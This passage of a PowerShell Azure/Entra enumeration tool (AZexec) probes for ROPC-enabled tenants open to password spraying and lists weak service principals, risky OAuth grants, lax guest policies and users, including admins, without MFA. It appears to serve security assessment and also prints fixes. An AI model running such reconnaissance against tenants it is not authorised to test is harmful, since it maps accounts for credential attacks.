            $null = Invoke-RestMethod -Uri $guestTestUrl -Method Post -Body $testBody -ContentType "application/x-www-form-urlencoded" -ErrorAction Stop
        } catch {
            $errorResponse = $_.ErrorDetails.Message | ConvertFrom-Json -ErrorAction SilentlyContinue
            
            if ($errorResponse.error -eq "invalid_grant") {
                $errorDesc = $errorResponse.error_description
                
                # AADSTS50034 = user doesn't exist (but tenant accepts ROPC)
                if ($errorDesc -match "AADSTS50034") {
                    $finding = [PSCustomObject]@{
                        Type = "TenantConfig"
                        Target = $Domain
                        Vulnerability = "ROPCEnabled"
                        Risk = "HIGH"
                        Description = "Resource Owner Password Credentials (ROPC) flow accepted - Password spray possible"
                        Authenticated = $false
                    }
                    $unauthFindings += $finding
                    Write-ColorOutput -Message "    [!] ROPC ENABLED - Password spray/brute force possible" -Color "Red"
                }
                
                # AADSTS50053 = account locked (but ROPC works)
                if ($errorDesc -match "AADSTS50053") {
                    $finding = [PSCustomObject]@{
                        Type = "TenantConfig"
                        Target = $Domain
                        Vulnerability = "ROPCEnabled"
                        Risk = "HIGH"
                        Description = "ROPC flow accepted (account lockout detected)"
                        Authenticated = $false
                    }
                    $unauthFindings += $finding
                    Write-ColorOutput -Message "    [!] ROPC ENABLED - Account lockout policy detected" -Color "Yellow"
                }
                
                # AADSTS50126 = invalid password (ROPC works, user exists)
                if ($errorDesc -match "AADSTS50126") {
                    Write-ColorOutput -Message "    [+] ROPC enabled, user validation possible" -Color "Green"
                }
            }
            
            # AADSTS7000218 = ROPC disabled (good security)
            if ($_.ErrorDetails.Message -match "AADSTS7000218") {
                Write-ColorOutput -Message "    [+] ROPC DISABLED - Good security posture" -Color "Green"
            }
        }
        
        # 1.3 Check for legacy authentication endpoints
        Write-ColorOutput -Message "`n[*] Checking legacy authentication endpoints..." -Color "Yellow"
        
        $legacyEndpoints = @(
            @{ Name = "Exchange ActiveSync"; Url = "https://outlook.office365.com/Microsoft-Server-ActiveSync"; Method = "OPTIONS" },
            @{ Name = "Autodiscover"; Url = "https://autodiscover.$Domain/autodiscover/autodiscover.xml"; Method = "GET" },
            @{ Name = "EWS"; Url = "https://outlook.office365.com/EWS/Exchange.asmx"; Method = "OPTIONS" }
        )
        
        foreach ($endpoint in $legacyEndpoints) {
            try {
                $response = Invoke-WebRequest -Uri $endpoint.Url -Method $endpoint.Method -TimeoutSec 5 -ErrorAction SilentlyContinue -UseBasicParsing
                if ($response.StatusCode -in @(200, 401, 403)) {
                    Write-ColorOutput -Message "    [*] $($endpoint.Name) endpoint accessible" -Color "DarkGray"
                }
            } catch {
                if ($_.Exception.Response.StatusCode -eq 401) {
                    Write-ColorOutput -Message "    [*] $($endpoint.Name) endpoint accessible (requires auth)" -Color "DarkGray"
                }
            }
        }
    }
    
    # ============================================
    # PHASE 2: AUTHENTICATED CHECKS
    # ============================================
    Write-ColorOutput -Message "`n[*] PHASE 2: Authenticated Enumeration" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    # Check if we can connect to Graph
    $graphConnected = $false
    try {
        $context = Get-MgContext -ErrorAction SilentlyContinue
        if ($context) {
            $graphConnected = $true
            Write-ColorOutput -Message "[+] Using existing Graph connection: $($context.Account)" -Color "Green"
        }
    } catch {
        # Not connected yet
    }
    
    if (-not $graphConnected) {
        Write-ColorOutput -Message "[*] Attempting to connect to Microsoft Graph..." -Color "Yellow"
        try {
            # Request scopes needed for vuln enumeration
            Connect-MgGraph -Scopes "Application.Read.All","Directory.Read.All","Policy.Read.All","AuditLog.Read.All" -ErrorAction Stop
            $context = Get-MgContext
            $graphConnected = $true
            Write-ColorOutput -Message "[+] Connected as: $($context.Account)" -Color "Green"
            
            # Check if user is a guest
            $isGuest = Test-IsGuestUser -UserPrincipalName $context.Account
            if ($isGuest) {
                Write-ColorOutput -Message "[!] GUEST USER - Some enumeration may be restricted`n" -Color "Yellow"
            }
        } catch {
            Write-ColorOutput -Message "[!] Could not connect to Microsoft Graph" -Color "Yellow"
            Write-ColorOutput -Message "[*] Authenticated checks will be skipped" -Color "DarkGray"
            Write-ColorOutput -Message "[*] Error: $($_.Exception.Message)" -Color "DarkGray"
        }
    }
    
    if ($graphConnected) {
        Write-ColorOutput -Message ""
        
        # 2.1 Service Principals with Password Credentials (HIGH VALUE)
        Write-ColorOutput -Message "[*] Enumerating Service Principals with password credentials..." -Color "Yellow"
        Write-ColorOutput -Message "    (Like SMB hosts without signing - weaker authentication)" -Color "DarkGray"
        
        try {
            $servicePrincipals = Get-MgServicePrincipal -All -Property "id,displayName,appId,passwordCredentials,keyCredentials,servicePrincipalType" -ErrorAction Stop
            
            $passwordOnlyCount = 0
            foreach ($sp in $servicePrincipals) {
                $hasPasswordCred = $sp.PasswordCredentials.Count -gt 0
                $hasCertCred = $sp.KeyCredentials.Count -gt 0
                
                if ($hasPasswordCred -and -not $hasCertCred) {
                    # Password-only = VULNERABLE (like SMB signing disabled)
                    $finding = [PSCustomObject]@{
                        Type = "ServicePrincipal"
                        Target = $sp.DisplayName
                        AppId = $sp.AppId
                        ObjectId = $sp.Id
                        Vulnerability = "PasswordCredentialOnly"
                        Risk = "HIGH"
                        Description = "Uses password credential without certificate - vulnerable to credential theft"
                        Authenticated = $true
                        CredentialCount = $sp.PasswordCredentials.Count
                        ExpiringCredentials = ($sp.PasswordCredentials | Where-Object { $_.EndDateTime -lt (Get-Date).AddDays(30) }).Count
                    }
                    $authFindings += $finding
                    $passwordOnlyCount++
                    
                    if ($passwordOnlyCount -le 10) {
                        $expiring = if ($finding.ExpiringCredentials -gt 0) { " [EXPIRING SOON]" } else { "" }
                        Write-ColorOutput -Message "    [!] $($sp.DisplayName)$expiring" -Color "Red"
                        Write-ColorOutput -Message "        AppId: $($sp.AppId)" -Color "DarkGray"
                    }
                }
            }
            
            if ($passwordOnlyCount -gt 10) {
                Write-ColorOutput -Message "    ... and $($passwordOnlyCount - 10) more" -Color "DarkGray"
            }
            
            Write-ColorOutput -Message "`n    [*] Total password-only service principals: $passwordOnlyCount" -Color $(if ($passwordOnlyCount -gt 0) { "Yellow" } else { "Green" })
            
        } catch {
            if ($_.Exception.Message -like "*403*" -or $_.Exception.Message -like "*Forbidden*" -or $_.Exception.Message -like "*Authorization*") {
                Write-ColorOutput -Message "    [!] Access Denied - Requires Application.Read.All permission" -Color "Yellow"
            } else {
                Write-ColorOutput -Message "    [!] Error: $($_.Exception.Message)" -Color "Red"
            }
        }
        
        # 2.2 Applications with Public Client enabled (ROPC vulnerable)
        Write-ColorOutput -Message "`n[*] Enumerating applications with public client flows enabled..." -Color "Yellow"
        Write-ColorOutput -Message "    (Allows ROPC - direct username/password authentication)" -Color "DarkGray"
        
        try {
            $apps = Get-MgApplication -All -Property "id,displayName,appId,isFallbackPublicClient,publicClient,signInAudience,requiredResourceAccess" -ErrorAction Stop
            
            $publicClientCount = 0
            foreach ($app in $apps) {
                $isPublicClient = $app.IsFallbackPublicClient -eq $true -or ($app.PublicClient -and $app.PublicClient.RedirectUris.Count -gt 0)
                
                if ($isPublicClient) {
                    # Check for dangerous permissions
                    $dangerousPerms = @()
                    foreach ($resource in $app.RequiredResourceAccess) {
                        foreach ($perm in $resource.ResourceAccess) {
                            if ($perm.Type -eq "Role") {
                                $dangerousPerms += "AppRole"
                            }
                        }
                    }
                    
                    $risk = if ($dangerousPerms.Count -gt 0) { "HIGH" } else { "MEDIUM" }
                    
                    $finding = [PSCustomObject]@{
                        Type = "Application"
                        Target = $app.DisplayName
                        AppId = $app.AppId
                        ObjectId = $app.Id
                        Vulnerability = "PublicClientEnabled"
                        Risk = $risk
                        Description = "Public client flow enabled - ROPC authentication possible"
                        Authenticated = $true
                        SignInAudience = $app.SignInAudience
                        HasAppRoles = $dangerousPerms.Count -gt 0
                    }
                    $authFindings += $finding
                    $publicClientCount++
                    
                    if ($publicClientCount -le 10) {
                        $riskColor = if ($risk -eq "HIGH") { "Red" } else { "Yellow" }
                        Write-ColorOutput -Message "    [!] $($app.DisplayName) [$risk]" -Color $riskColor
                        Write-ColorOutput -Message "        AppId: $($app.AppId) | Audience: $($app.SignInAudience)" -Color "DarkGray"
                    }
                }
            }
            
            if ($publicClientCount -gt 10) {
                Write-ColorOutput -Message "    ... and $($publicClientCount - 10) more" -Color "DarkGray"
            }
            
            Write-ColorOutput -Message "`n    [*] Total public client applications: $publicClientCount" -Color $(if ($publicClientCount -gt 0) { "Yellow" } else { "Green" })
            
        } catch {
            if ($_.Exception.Message -like "*403*" -or $_.Exception.Message -like "*Forbidden*" -or $_.Exception.Message -like "*Authorization*") {
                Write-ColorOutput -Message "    [!] Access Denied - Requires Application.Read.All permission" -Color "Yellow"
            } else {
                Write-ColorOutput -Message "    [!] Error: $($_.Exception.Message)" -Color "Red"
            }
        }
        
        # 2.3 Check Security Defaults status
        Write-ColorOutput -Message "`n[*] Checking Security Defaults and Conditional Access..." -Color "Yellow"
        
        try {
            $securityDefaults = Invoke-MgGraphRequest -Uri "https://graph.microsoft.com/v1.0/policies/identitySecurityDefaultsEnforcementPolicy" -Method GET -ErrorAction Stop
            
            if ($securityDefaults.isEnabled -eq $false) {
                $finding = [PSCustomObject]@{
                    Type = "Policy"
                    Target = "SecurityDefaults"
                    Vulnerability = "SecurityDefaultsDisabled"
                    Risk = "MEDIUM"
                    Description = "Security Defaults disabled - check for Conditional Access coverage"
                    Authenticated = $true
                }
                $authFindings += $finding
                Write-ColorOutput -Message "    [!] SECURITY DEFAULTS DISABLED" -Color "Yellow"
                Write-ColorOutput -Message "        Check if Conditional Access provides equivalent protection" -Color "DarkGray"
            } else {
                Write-ColorOutput -Message "    [+] Security Defaults ENABLED - Good baseline" -Color "Green"
            }
        } catch {
            Write-ColorOutput -Message "    [!] Could not check Security Defaults (requires Policy.Read.All)" -Color "DarkGray"
        }
        
        # 2.4 Check for legacy authentication in Conditional Access
        try {
            $caPolicies = Invoke-MgGraphRequest -Uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" -Method GET -ErrorAction Stop
            
            $legacyAuthBlocked = $false
            foreach ($policy in $caPolicies.value) {
                if ($policy.conditions.clientAppTypes -contains "exchangeActiveSync" -or 
                    $policy.conditions.clientAppTypes -contains "other") {
                    if ($policy.grantControls.builtInControls -contains "block" -and $policy.state -eq "enabled") {
                        $legacyAuthBlocked = $true
                    }
                }
            }
            
            if (-not $legacyAuthBlocked) {
                $finding = [PSCustomObject]@{
                    Type = "Policy"
                    Target = "ConditionalAccess"
                    Vulnerability = "LegacyAuthNotBlocked"
                    Risk = "HIGH"
                    Description = "No Conditional Access policy blocking legacy authentication - MFA bypass possible"
                    Authenticated = $true
                }
                $authFindings += $finding
                Write-ColorOutput -Message "    [!] LEGACY AUTH NOT BLOCKED - MFA bypass possible" -Color "Red"
            } else {
                Write-ColorOutput -Message "    [+] Legacy authentication blocked by Conditional Access" -Color "Green"
            }
            
            Write-ColorOutput -Message "    [*] Found $($caPolicies.value.Count) Conditional Access policies" -Color "DarkGray"
            
        } catch {
            Write-ColorOutput -Message "    [!] Could not enumerate Conditional Access (requires Policy.Read.All)" -Color "DarkGray"
        }
        
        # 2.5 Enumerate guest users with potentially excessive permissions
        Write-ColorOutput -Message "`n[*] Enumerating guest users..." -Color "Yellow"
        Write-ColorOutput -Message "    (External users = potential 'null session' equivalent)" -Color "DarkGray"
        
        try {
            $guestUsers = Get-MgUser -Filter "userType eq 'Guest'" -All -Property "id,displayName,userPrincipalName,createdDateTime,signInActivity" -ErrorAction Stop
            
            $staleGuestCount = 0
            $activeGuestCount = 0
            $cutoffDate = (Get-Date).AddDays(-90)
            
            foreach ($guest in $guestUsers) {
                $lastSignIn = $guest.SignInActivity.LastSignInDateTime
                $isStale = (-not $lastSignIn) -or ($lastSignIn -lt $cutoffDate)
                
                if ($isStale) {
                    $staleGuestCount++
                    if ($staleGuestCount -le 5) {
                        $finding = [PSCustomObject]@{
                            Type = "User"
                            Target = $guest.DisplayName
                            UPN = $guest.UserPrincipalName
                            Vulnerability = "StaleGuestAccount"
                            Risk = "MEDIUM"
                            Description = "Guest account with no recent sign-in activity"
                            Authenticated = $true
                            LastSignIn = $lastSignIn
                            CreatedDate = $guest.CreatedDateTime
                        }
                        $authFindings += $finding
                    }
                } else {
                    $activeGuestCount++
                }
            }
            
            Write-ColorOutput -Message "    [*] Total guest users: $($guestUsers.Count)" -Color "Cyan"
            Write-ColorOutput -Message "    [*] Active guests (90 days): $activeGuestCount" -Color "Cyan"
            if ($staleGuestCount -gt 0) {
                Write-ColorOutput -Message "    [!] Stale guests (no activity 90+ days): $staleGuestCount" -Color "Yellow"
            }
            
        } catch {
            if ($_.Exception.Message -like "*403*" -or $_.Exception.Message -like "*Forbidden*") {
                Write-ColorOutput -Message "    [!] Access Denied - Guest enumeration restricted" -Color "Yellow"
            } else {
                Write-ColorOutput -Message "    [!] Error: $($_.Exception.Message)" -Color "DarkGray"
            }
        }
        
        # 2.6 Check for apps with dangerous permissions
        Write-ColorOutput -Message "`n[*] Checking for applications with dangerous API permissions..." -Color "Yellow"
        
        try {
            $dangerousPermissions = @(
                "RoleManagement.ReadWrite.Directory",
                "AppRoleAssignment.ReadWrite.All", 
                "Application.ReadWrite.All",
                "Directory.ReadWrite.All",
                "Mail.ReadWrite",
                "Mail.Send",
                "Files.ReadWrite.All",
                "Sites.ReadWrite.All",
                "User.ReadWrite.All"
            )
            
            $oauth2Grants = Invoke-MgGraphRequest -Uri "https://graph.microsoft.com/v1.0/oauth2PermissionGrants" -Method GET -ErrorAction Stop
            
            $dangerousGrantCount = 0
            foreach ($grant in $oauth2Grants.value) {
                $grantedScopes = $grant.scope -split ' '
                $dangerousScopes = $grantedScopes | Where-Object { $_ -in $dangerousPermissions }
                
                if ($dangerousScopes.Count -gt 0) {
                    # Get the app name
                    try {
                        $sp = Get-MgServicePrincipal -ServicePrincipalId $grant.clientId -Property "displayName" -ErrorAction SilentlyContinue
                        $appName = if ($sp) { $sp.DisplayName } else { $grant.clientId }
                    } catch {
                        $appName = $grant.clientId
                    }
                    
                    $finding = [PSCustomObject]@{
                        Type = "OAuth2Grant"
                        Target = $appName
                        ClientId = $grant.clientId
                        Vulnerability = "DangerousPermissions"
                        Risk = "HIGH"
                        Description = "Application has dangerous delegated permissions: $($dangerousScopes -join ', ')"
                        Authenticated = $true
                        Permissions = $dangerousScopes -join ', '
                        ConsentType = $grant.consentType
                    }
                    $authFindings += $finding
                    $dangerousGrantCount++
                    
                    if ($dangerousGrantCount -le 5) {
                        Write-ColorOutput -Message "    [!] $appName" -Color "Red"
                        Write-ColorOutput -Message "        Permissions: $($dangerousScopes -join ', ')" -Color "DarkGray"
                    }
                }
            }
            
            if ($dangerousGrantCount -gt 5) {
                Write-ColorOutput -Message "    ... and $($dangerousGrantCount - 5) more" -Color "DarkGray"
            }
            
            if ($dangerousGrantCount -eq 0) {
                Write-ColorOutput -Message "    [+] No applications with high-risk permissions found" -Color "Green"
            } else {
                Write-ColorOutput -Message "`n    [*] Total apps with dangerous permissions: $dangerousGrantCount" -Color "Yellow"
            }
            
        } catch {
            Write-ColorOutput -Message "    [!] Could not enumerate OAuth grants (requires Directory.Read.All)" -Color "DarkGray"
        }
        
        # 2.7 Check Guest User Permission Level (Authorization Policy)
        Write-ColorOutput -Message "`n[*] Checking guest user permission level..." -Color "Yellow"
        Write-ColorOutput -Message "    (Determines what guests can enumerate - the 'null session' equivalent)" -Color "DarkGray"
        
        try {
            $authPolicy = Invoke-MgGraphRequest -Uri "https://graph.microsoft.com/v1.0/policies/authorizationPolicy" -Method GET -ErrorAction Stop
            
            $guestAccess = $authPolicy.guestUserRoleId
            
            # Guest role IDs:
            # a0b1b346-4d3e-4e8b-98f8-753987be4970 = Same as member users (MOST PERMISSIVE)
            # 10dae51f-b6af-4016-8d66-8c2a99b929b3 = Limited access (default)
            # 2af84b1e-32c8-42b7-82bc-daa82404023b = Restricted access (MOST RESTRICTIVE)
            
            $guestPermissionLevel = switch ($guestAccess) {
                "a0b1b346-4d3e-4e8b-98f8-753987be4970" { "SameAsMemberUsers" }
                "10dae51f-b6af-4016-8d66-8c2a99b929b3" { "LimitedAccess" }
                "2af84b1e-32c8-42b7-82bc-daa82404023b" { "RestrictedAccess" }
                default { "Unknown ($guestAccess)" }
            }
            
            if ($guestAccess -eq "a0b1b346-4d3e-4e8b-98f8-753987be4970") {
                $finding = [PSCustomObject]@{
                    Type = "Policy"
                    Target = "GuestUserAccess"
                    Vulnerability = "GuestAccessSameAsMember"
                    Risk = "HIGH"
                    Description = "Guest users have SAME permissions as member users - full directory enumeration possible"
                    Authenticated = $true
                    GuestRoleId = $guestAccess
                    PermissionLevel = $guestPermissionLevel
                }
                $authFindings += $finding
                Write-ColorOutput -Message "    [!] CRITICAL: Guest access = SAME AS MEMBER USERS" -Color "Red"
                Write-ColorOutput -Message "        Guests can enumerate entire directory (null session equivalent)" -Color "DarkGray"
            } elseif ($guestAccess -eq "10dae51f-b6af-4016-8d66-8c2a99b929b3") {
                $finding = [PSCustomObject]@{
                    Type = "Policy"
                    Target = "GuestUserAccess"
                    Vulnerability = "GuestAccessLimited"
                    Risk = "MEDIUM"
                    Description = "Guest users have limited access - can still enumerate some directory info"
                    Authenticated = $true
                    GuestRoleId = $guestAccess
                    PermissionLevel = $guestPermissionLevel
                }
                $authFindings += $finding
                Write-ColorOutput -Message "    [!] Guest access = LIMITED (default)" -Color "Yellow"
                Write-ColorOutput -Message "        Guests can enumerate users/groups they interact with" -Color "DarkGray"
            } else {
                Write-ColorOutput -Message "    [+] Guest access = RESTRICTED (most secure)" -Color "Green"
                Write-ColorOutput -Message "        Guests can only see their own profile" -Color "DarkGray"
            }
            
            # Check if guest invite settings are permissive
            $guestInviteSettings = $authPolicy.allowInvitesFrom
            if ($guestInviteSettings -eq "everyone") {
                $finding = [PSCustomObject]@{
                    Type = "Policy"
                    Target = "GuestInvitePolicy"
                    Vulnerability = "AnyoneCanInviteGuests"
                    Risk = "MEDIUM"
                    Description = "Anyone (including guests) can invite external users"
                    Authenticated = $true
                    AllowInvitesFrom = $guestInviteSettings
                }
                $authFindings += $finding
                Write-ColorOutput -Message "    [!] Guest invites: ANYONE can invite (including guests)" -Color "Yellow"
            } elseif ($guestInviteSettings -eq "adminsAndGuestInviters") {
                Write-ColorOutput -Message "    [*] Guest invites: Admins and Guest Inviters only" -Color "DarkGray"
            } else {
                Write-ColorOutput -Message "    [+] Guest invites: Admins only" -Color "Green"
            }
            
        } catch {
            Write-ColorOutput -Message "    [!] Could not check authorization policy (requires Policy.Read.All)" -Color "DarkGray"
        }
        
        # 2.8 Check for users without MFA registered
        Write-ColorOutput -Message "`n[*] Checking for users without MFA methods registered..." -Color "Yellow"
        Write-ColorOutput -Message "    (Users vulnerable to credential stuffing/phishing)" -Color "DarkGray"
        
        try {
            # Get authentication methods registration details
            $authMethodsReport = Invoke-MgGraphRequest -Uri "https://graph.microsoft.com/v1.0/reports/authenticationMethods/userRegistrationDetails" -Method GET -ErrorAction Stop
            
            $noMfaUsers = @()
            $mfaRegisteredCount = 0
            $totalChecked = 0
            
            foreach ($user in $authMethodsReport.value) {
                $totalChecked++
                
                # Check if user has any MFA method registered
                $hasMfa = $user.isMfaRegistered -eq $true
                
                if (-not $hasMfa) {
                    $noMfaUsers += $user
                    
                    if ($noMfaUsers.Count -le 5) {
                        $finding = [PSCustomObject]@{
                            Type = "User"
                            Target = $user.userDisplayName
                            UPN = $user.userPrincipalName
                            Vulnerability = "NoMFARegistered"
                            Risk = "HIGH"
                            Description = "User has no MFA methods registered - vulnerable to credential attacks"
                            Authenticated = $true
                            IsAdmin = $user.isAdmin
                            MethodsRegistered = ($user.methodsRegistered -join ', ')
                        }
                        $authFindings += $finding
                    }
                } else {
                    $mfaRegisteredCount++
                }
            }
            
            # Show results
            if ($noMfaUsers.Count -gt 0) {
                Write-ColorOutput -Message "    [!] Users WITHOUT MFA: $($noMfaUsers.Count)" -Color "Red"
                
                # Show first few
                $displayCount = [Math]::Min(5, $noMfaUsers.Count)
                for ($i = 0; $i -lt $displayCount; $i++) {
                    $u = $noMfaUsers[$i]
                    $adminTag = if ($u.isAdmin) { " [ADMIN]" } else { "" }
                    Write-ColorOutput -Message "        - $($u.userDisplayName)$adminTag" -Color "Red"
                }
                
                if ($noMfaUsers.Count -gt 5) {
                    Write-ColorOutput -Message "        ... and $($noMfaUsers.Count - 5) more" -Color "DarkGray"
                }
                
                # Check for admins without MFA (critical)
                $adminsNoMfa = $noMfaUsers | Where-Object { $_.isAdmin -eq $true }
                if ($adminsNoMfa.Count -gt 0) {
                    Write-ColorOutput -Message "    [!] CRITICAL: $($adminsNoMfa.Count) ADMIN(S) without MFA!" -Color "Red"
                }
            } else {
                Write-ColorOutput -Message "    [+] All users have MFA registered" -Color "Green"
            }
            
            Write-ColorOutput -Message "    [*] Total checked: $totalChecked | With MFA: $mfaRegisteredCount | Without: $($noMfaUsers.Count)" -Color "DarkGray"
            
        } catch {
            if ($_.Exception.Message -like "*403*" -or $_.Exception.Message -like "*Forbidden*") {
                Write-ColorOutput -Message "    [!] Access Denied - Requires UserAuthenticationMethod.Read.All or Reports.Read.All" -Color "Yellow"
                Write-ColorOutput -Message "        Try alternative: checking per-user auth methods (slower)" -Color "DarkGray"
            } else {
                Write-ColorOutput -Message "    [!] Could not retrieve MFA registration report" -Color "DarkGray"
                Write-ColorOutput -Message "        Error: $($_.Exception.Message)" -Color "DarkGray"
            }
        }
    }
    
    # ============================================
    # SUMMARY AND EXPORT
    # ============================================
    Write-ColorOutput -Message "`n[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] VULNERABILITY SUMMARY" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    # Combine all findings
    $vulnTargets = $unauthFindings + $authFindings
    
    # Count by risk level
    $highRisk = ($vulnTargets | Where-Object { $_.Risk -eq "HIGH" }).Count
    $mediumRisk = ($vulnTargets | Where-Object { $_.Risk -eq "MEDIUM" }).Count
    $lowRisk = ($vulnTargets | Where-Object { $_.Risk -eq "LOW" }).Count
    
    Write-ColorOutput -Message "AZR".PadRight(12) + $(if ($Domain) { $Domain } else { "(auto-detected)" }).ToString().PadRight(35) + "443".PadRight(7) + "[*] Vuln-List Results" -Color "Cyan"
    Write-ColorOutput -Message ""
    
    if ($highRisk -gt 0) {
        Write-ColorOutput -Message "    [!] HIGH RISK findings:   $highRisk" -Color "Red"
    }
    if ($mediumRisk -gt 0) {
        Write-ColorOutput -Message "    [!] MEDIUM RISK findings: $mediumRisk" -Color "Yellow"
    }
    if ($lowRisk -gt 0) {
        Write-ColorOutput -Message "    [*] LOW RISK findings:    $lowRisk" -Color "DarkGray"
    }
    
    Write-ColorOutput -Message "    [*] Total findings:       $($vulnTargets.Count)" -Color "Cyan"
    Write-ColorOutput -Message ""
    
    # Export if requested
    if ($ExportPath -and $vulnTargets.Count -gt 0) {
        try {
            $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
            
            if ($extension -eq ".csv") {
                $vulnTargets | Export-Csv -Path $ExportPath -NoTypeInformation -Force
            } elseif ($extension -eq ".json") {
                $vulnTargets | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
            } elseif ($extension -eq ".txt") {
                # Text format similar to nxc relay list
                $relayList = $vulnTargets | Where-Object { $_.Risk -eq "HIGH" } | ForEach-Object {
                    "$($_.Type),$($_.Target),$($_.Vulnerability)"
                }
                $relayList | Out-File -FilePath $ExportPath -Force
                Write-ColorOutput -Message "[+] Exported $($relayList.Count) HIGH risk targets to: $ExportPath" -Color "Green"
            } else {
                # Default to JSON
                $vulnTargets | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
            }
            
            if ($extension -ne ".txt") {
                Write-ColorOutput -Message "[+] Full results exported to: $ExportPath" -Color "Green"
            }
        } catch {
            Write-ColorOutput -Message "[!] Failed to export results: $_" -Color "Red"
        }
    }
    
    # Provide recommendations
    Write-ColorOutput -Message "`n[*] RECOMMENDATIONS:" -Color "Yellow"
    
    if ($highRisk -gt 0) {
        Write-ColorOutput -Message "    [!] Address HIGH risk findings immediately:" -Color "Red"
        Write-ColorOutput -Message "        - Replace password credentials with certificates for service principals" -Color "DarkGray"
        Write-ColorOutput -Message "        - Block legacy authentication via Conditional Access" -Color "DarkGray"
        Write-ColorOutput -Message "        - Review and minimize dangerous API permissions" -Color "DarkGray"
    }
    
    if ($mediumRisk -gt 0) {
        Write-ColorOutput -Message "    [*] Review MEDIUM risk findings:" -Color "Yellow"
        Write-ColorOutput -Message "        - Audit public client applications" -Color "DarkGray"
        Write-ColorOutput -Message "        - Clean up stale guest accounts" -Color "DarkGray"
        Write-ColorOutput -Message "        - Enable Security Defaults or equivalent CA policies" -Color "DarkGray"
    }
    
    Write-ColorOutput -Message "`n[*] Vuln-list enumeration complete!" -Color "Green"
    
    return $vulnTargets
}

function Show-Banner {
    Write-Host ""
    
    $asciiArt = @"
 █████╗ ███████╗███████╗██╗  ██╗███████╗ ██████╗
██╔══██╗╚══███╔╝██╔════╝╚██╗██╔╝██╔════╝██╔════╝
███████║  ███╔╝ █████╗   ╚███╔╝ █████╗  ██║     
██╔══██║ ███╔╝  ██╔══╝   ██╔██╗ ██╔══╝  ██║     
██║  ██║███████╗███████╗██╔╝ ██╗███████╗╚██████╗
╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝
"@
    
    # Try to use colors if available (PowerShell supports ANSI by default on modern systems)
    try {
        # Check if ANSI escape sequences are supported
        if ($Host.UI.SupportsVirtualTerminal) {
            # ANSI color codes: Bright Magenta for ASCII art, Yellow for title
            $magenta = "`e[95m"
            $yellow = "`e[33m"
            $reset = "`e[0m"
            
            Write-Host "${magenta}${asciiArt}${reset}"
            Write-Host "${yellow}    The Azure Execution Tool${reset}"
        }
        else {
            # Fallback to PowerShell colors
            Write-Host $asciiArt -ForegroundColor Magenta
            Write-Host "    The Azure Execution Tool" -ForegroundColor Yellow
        }
    }
    catch {
        # Fallback without colors
        Write-Host $asciiArt
        Write-Host "    The Azure Execution Tool"
    }
    
    Write-Host "    https://logisek.com | info@logisek.com"
    Write-Host "    AZexec | github.com/Logisek/AZexec"
    Write-Host ""
    Write-Host ""
}

function Show-Help {
    Write-ColorOutput -Message "`n[*] AZX - Azure/Entra Enumeration Tool - Available Commands`n" -Color "Yellow"
    
    $commands = @(
        @{Name="hosts"; Auth="Required"; Description="Enumerate devices from Azure/Entra ID (mimics nxc smb --hosts)"}
        @{Name="tenant"; Auth="Not Required"; Description="Discover tenant configuration and endpoints"}
        @{Name="users"; Auth="Not Required"; Description="Enumerate username existence (no authentication)"}
        @{Name="user-profiles"; Auth="Required"; Description="Enumerate user profiles with full details"}
        @{Name="groups"; Auth="Required"; Description="Enumerate Azure Entra ID groups"}
        @{Name="pass-pol"; Auth="Required"; Description="Enumerate password policies and security defaults"}
        @{Name="guest"; Auth="Not Required"; Description="Test guest/external authentication (mimics nxc smb -u 'a' -p '')"}
        @{Name="vuln-list"; Auth="Hybrid"; Description="Enumerate vulnerable targets (mimics nxc smb --gen-relay-list)"}
        @{Name="sessions"; Auth="Required"; Description="Enumerate active sessions (mimics nxc smb --qwinsta)"}
        @{Name="guest-vuln-scan"; Auth="Hybrid"; Description="Automated guest user vulnerability scanner"}
        @{Name="apps"; Auth="Required"; Description="Enumerate registered applications and service principals"}
        @{Name="sp-discovery"; Auth="Required"; Description="Discover service principals with permissions and roles"}
        @{Name="roles"; Auth="Required"; Description="Enumerate directory role assignments and privileged accounts"}
        @{Name="ca-policies"; Auth="Required"; Description="Review conditional access policies (member accounts only)"}
        @{Name="help"; Auth="N/A"; Description="Display this help message"}
    )
    
    Write-ColorOutput -Message "Command".PadRight(20) + "Auth".PadRight(15) + "Description" -Color "Cyan"
    Write-ColorOutput -Message ("-" * 80) -Color "DarkGray"
    
    foreach ($cmd in $commands) {
        $authColor = switch ($cmd.Auth) {
            "Required" { "Yellow" }
            "Not Required" { "Green" }
            "Hybrid" { "Cyan" }
            default { "White" }
        }
        
        Write-Host $cmd.Name.PadRight(20) -NoNewline
        if ($NoColor) {
            Write-Host $cmd.Auth.PadRight(15) -NoNewline
        } else {
            Write-Host $cmd.Auth.PadRight(15) -ForegroundColor $authColor -NoNewline
        }
        Write-Host $cmd.Description
    }
    
    Write-ColorOutput -Message "`n[*] Examples:" -Color "Yellow"
    Write-Host "    .\azx.ps1 hosts                          - Enumerate all devices"
    Write-Host "    .\azx.ps1 tenant -Domain example.com     - Discover tenant configuration"
    Write-Host "    .\azx.ps1 users -CommonUsernames         - Check common usernames"
    Write-Host "    .\azx.ps1 groups -ExportPath groups.csv  - Export groups to CSV"
    Write-Host "    .\azx.ps1 sp-discovery                   - Discover service principals"
    Write-Host "    .\azx.ps1 roles -ExportPath roles.json   - Export role assignments to JSON"
    Write-Host "    .\azx.ps1 ca-policies                    - Review conditional access policies"
    
    Write-ColorOutput -Message "`n[*] For detailed help and more examples, see README.md or use Get-Help .\azx.ps1" -Color "Cyan"
    Write-Host ""
}

Show-Banner

# Main execution
# For tenant discovery and user enumeration, we don't need Graph module
# For authenticated commands (hosts, groups, pass-pol, sessions), we need Graph module
# vuln-list handles authentication internally (hybrid unauthenticated + authenticated)
if ($Command -in @("hosts", "groups", "pass-pol", "sessions", "user-profiles", "roles", "apps", "sp-discovery", "ca-policies")) {
    Initialize-GraphModule
    
    # Determine required scopes based on command
    $requiredScopes = switch ($Command) {
        "hosts" { "Device.Read.All" }
        "user-profiles" { "User.Read.All,Directory.Read.All,AuditLog.Read.All" }
        "groups" { "Group.Read.All,Directory.Read.All" }
